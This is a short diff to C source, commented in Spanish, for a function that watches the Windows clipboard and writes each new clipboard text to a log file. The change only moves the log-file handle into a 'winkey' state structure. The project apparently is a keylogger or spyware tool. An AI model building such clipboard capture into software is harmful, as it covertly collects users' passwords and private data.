@@ -40,7 +40,7 @@ static char lastClipboardText[512] = {0};
 void LogClipboardIfChanged(void)
 {
     // Comprobamos si el archivo de log esta abierto
-    if (!logFile) {
+    if (!g_winkeyState.logFile) {
         DebugLog("El archivo de log principal no está abierto. Saliendo.");
         return ;
     }
@@ -67,8 +67,8 @@ void LogClipboardIfChanged(void)
         // Comparamos el texto actual con el ultimo que guardamos.
         if (strcmp(clipboardText, lastClipboardText) != 0 && strlen(clipboardText) > 0) {
             // Escribimos cabecera portapapeles
-            fprintf(logFile, "\n\n####### Init clipboard #######\n%s\n####### finish clipboard #######\n", clipboardText);
-            fflush(logFile);
+            fprintf(g_winkeyState.logFile, "\n\n####### Init clipboard #######\n%s\n####### finish clipboard #######\n", clipboardText);
+            fflush(g_winkeyState.logFile);
             // actualizamos nuestra memoria interna con el nuevo texto
             strcpy_s(lastClipboardText, sizeof(lastClipboardText), clipboardText);
         }
